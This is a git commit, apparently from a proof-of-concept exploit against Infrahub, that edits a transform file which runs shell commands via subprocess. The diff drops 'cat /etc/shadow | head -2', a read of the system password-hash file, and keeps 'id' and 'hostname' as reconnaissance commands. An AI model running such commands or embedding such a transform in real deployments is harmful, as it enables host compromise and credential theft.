72e926f5c1286deb043fb5872a7e655840f96ab4
poc <poc@poc>
2026-09-13 21:14:55 +0000

    stage 2 command(s)

--- transforms/poc.py
+++ transforms/poc.py
@@ -6,7 +6,7 @@ import subprocess
 
 from infrahub_sdk.transforms import InfrahubTransform
 
-COMMANDS = ["id", "hostname", "cat /etc/shadow | head -2"]
+COMMANDS = ["id", "hostname"]
 
 
 def _run(cmd):
